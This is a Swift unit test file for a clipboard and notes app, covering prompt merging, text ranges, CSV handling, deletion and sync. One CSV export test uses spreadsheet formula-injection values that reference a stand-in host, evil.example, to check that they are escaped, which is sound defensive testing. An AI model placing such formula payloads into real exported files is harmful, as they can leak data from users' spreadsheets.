import XCTest
@testable import ClipBaseApp

final class ClipBaseLogicTests: XCTestCase {
    func testPromptOptimizerMergeMatchesWebRules() {
        let prefix = PromptOptimizer(
            id: "p1",
            title: "Prefix",
            placement: .prefix,
            affixText: "請優化",
            position: 0,
            updatedAt: 1000,
            deletedAt: nil
        )
        let suffix = PromptOptimizer(
            id: "p2",
            title: "Suffix",
            placement: .suffix,
            affixText: "請輸出英文",
            position: 1,
            updatedAt: 1000,
            deletedAt: nil
        )

        XCTAssertEqual(prefix.mergedPrompt(input: ""), "請優化")
        XCTAssertEqual(prefix.mergedPrompt(input: "原始提示"), "請優化\n\n原始提示")
        XCTAssertEqual(suffix.mergedPrompt(input: "原始提示"), "原始提示\n\n請輸出英文")
    }

    func testCopyableRangesNormalizeSelectionAndOverlaps() {
        let content = "0123456789abcdef"
        let ranges = TextRangeHelpers.normalize([
            CopyableRange(start: 8, end: 12),
            CopyableRange(start: 2, end: 5),
            CopyableRange(start: 4, end: 7),
            CopyableRange(start: -1, end: 2),
            CopyableRange(start: 30, end: 40)
        ], content: content)

        XCTAssertEqual(ranges, [
            CopyableRange(start: 2, end: 7),
            CopyableRange(start: 8, end: 12)
        ])

        let selected = TextRangeHelpers.copyableRange(
            forSelection: NSRange(location: 2, length: 6),
            content: "xx  標記  yy"
        )
        XCTAssertEqual(selected, CopyableRange(start: 4, end: 6))
    }

    func testCSVParseAndExportMatchesFourColumnFormat() {
        let text = [
            "區塊,子區塊,欄位,值",
            "\"測試,帳號\",Admin,備註,\"line 1",
            "line 2 with \"\"quote\"\"\""
        ].joined(separator: "\n")

        XCTAssertEqual(CSVService.parse(text), [
            CSVRow(section: "測試,帳號", subsection: "Admin", field: "備註", value: "line 1\nline 2 with \"quote\"")
        ])

        let csv = CSVService.export([
            CSVRow(section: "=cmd", subsection: "+SUM(1,1)", field: "-10", value: "@HYPERLINK(\"https://evil.example\")"),
            CSVRow(section: "安全分類", subsection: "", field: "備註", value: "  =IMPORTXML(\"https://evil.example\")")
        ])

        XCTAssertEqual(csv, [
            "區塊,子區塊,欄位,值",
            "'=cmd,\"'+SUM(1,1)\",'-10,\"'@HYPERLINK(\"\"https://evil.example\"\")\"",
            "安全分類,,備註,\"'  =IMPORTXML(\"\"https://evil.example\"\")\""
        ].joined(separator: "\n"))
    }

    func testDeletingSectionMovesItemsToOtherAndKeepsTombstone() throws {
        let repository = LocalRepository(fileURL: temporaryStoreURL())
        let source = try repository.createSection(title: "待刪分類", now: 1000)
        let item = try repository.createItem(sectionId: source.id, name: "保留項目", content: "保留內容", now: 1200)

        let fallback = try repository.deleteSection(id: source.id, now: 2000)

        XCTAssertEqual(fallback.title, "其它")
        XCTAssertFalse(repository.activeSections.contains(where: { $0.id == source.id }))
        XCTAssertEqual(repository.allSections.first(where: { $0.id == source.id })?.deletedAt, 2000)

        let moved = repository.activeItems(in: fallback.id).first
        XCTAssertEqual(moved?.id, item.id)
        XCTAssertEqual(moved?.name, "保留項目")
        XCTAssertEqual(moved?.updatedAt, 2000)
    }

    func testRemoteLastWriteWinsIgnoresOlderAndAppliesNewer() throws {
        let repository = LocalRepository(fileURL: temporaryStoreURL())
        let section = try repository.createSection(title: "本機新版", now: 2000)

        try repository.applyRemoteChanges(
            SyncChanges(
                sections: [
                    ClipSection(id: section.id, title: "遠端舊版", position: 0, updatedAt: 1000, deletedAt: nil)
                ],
                items: [],
                optimizers: [],
                memoDocuments: []
            ),
            serverTime: 3000
        )

        XCTAssertEqual(repository.activeSections.first?.title, "本機新版")
        XCTAssertEqual(repository.lastSyncAt, 3000)

        try repository.applyRemoteChanges(
            SyncChanges(
                sections: [
                    ClipSection(id: section.id, title: "遠端新版", position: 0, updatedAt: 4000, deletedAt: nil)
                ],
                items: [],
                optimizers: [],
                memoDocuments: []
            ),
            serverTime: 5000
        )

        XCTAssertEqual(repository.activeSections.first?.title, "遠端新版")
        XCTAssertEqual(repository.lastSyncAt, 5000)
    }

    func testCSVImportHandlesCustomRowsAndExportsMetadataRows() throws {
        let repository = LocalRepository(fileURL: temporaryStoreURL())
        try repository.importCSVRows([
            CSVRow(section: "帳號", subsection: "", field: "Email", value: "a@example.com"),
            CSVRow(section: "自定義", subsection: "Token", field: "訊息", value: "abc"),
            CSVRow(section: "自定義", subsection: "Token", field: "建立時間", value: "2026/01/02")
        ], now: 1000)

        XCTAssertEqual(repository.activeSections.map(\.title), ["帳號", "自定義"])
        XCTAssertEqual(repository.activeItems(in: repository.activeSections[0].id).first?.name, "Email")
        XCTAssertEqual(repository.activeItems(in: repository.activeSections[1].id).first?.metadata, "建立時間：2026/01/02")

        XCTAssertEqual(repository.exportCSVRows(), [
            CSVRow(section: "帳號", subsection: "", field: "Email", value: "a@example.com"),
            CSVRow(section: "自定義", subsection: "Token", field: "訊息", value: "abc"),
            CSVRow(section: "自定義", subsection: "Token", field: "建立時間", value: "2026/01/02")
        ])
    }

    private func temporaryStoreURL() -> URL {
        FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString, isDirectory: true)
            .appendingPathComponent("clipbase-state.json")
    }
}
